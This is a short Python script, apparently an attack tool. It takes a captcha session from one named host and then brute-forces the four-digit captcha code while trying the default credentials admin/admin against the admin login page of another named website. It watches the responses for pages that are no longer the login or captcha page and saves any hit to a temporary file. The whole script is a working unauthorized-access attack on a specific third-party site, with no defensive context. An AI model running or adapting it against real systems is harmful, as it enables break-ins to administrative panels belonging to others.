import subprocess, json, time
r=subprocess.run(['curl','-sk','--connect-timeout','10','https://api.myxypt.com/captcha?width=140&height=48','-c','/tmp/cx.txt','-b','/tmp/cx.txt'],capture_output=True,text=True,timeout=12)
d=json.loads(r.stdout); uid=d['data']['uuid']; print(f'UID={uid}',flush=True)
for i in range(3000):
    cv=f'{i:04d}'
    r2=subprocess.run(['curl','-sk','--connect-timeout','3','-L','http://chinanaisi.com/admin/login.php','-X','POST','-d',f'action=loginpost&uuid={uid}&loginId=&username=admin&password=admin&checkcode={cv}','-b','/tmp/cx.txt'],capture_output=True,text=True,timeout=6)
    b=r2.stdout
    if '\u540e\u53f0\u767b\u5f55' not in b and '\u9a8c\u8bc1\u7801' not in b and len(b)>50:
        print(f'HIT:{cv} {b[:100]}',flush=True)
        open('/tmp/CX_HIT.txt','w').write(f'code={cv} uid={uid}\n{b[:500]}')
        break
    if i%300==0: print(f'[{i}/3000]',flush=True)
print('DONE',flush=True)
